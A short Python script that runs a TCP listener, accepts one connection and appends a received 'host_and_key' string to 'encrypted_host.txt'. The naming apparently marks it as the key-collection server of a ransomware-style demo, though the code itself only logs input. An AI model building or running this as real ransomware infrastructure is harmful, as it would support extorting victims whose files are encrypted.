import socket

ipaddress = '127.0.0.1' # change to ip address of server
port = 8001
print(ipaddress)

print('Creating a socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ipaddress, port))
    print('listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'connection from {ipaddress} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode().strip()
            with open('encrypted_host.txt', 'a') as f:
                f.write(host_and_key+'\n')
                print(host_and_key)
            break
        print('Connection completed and closed!')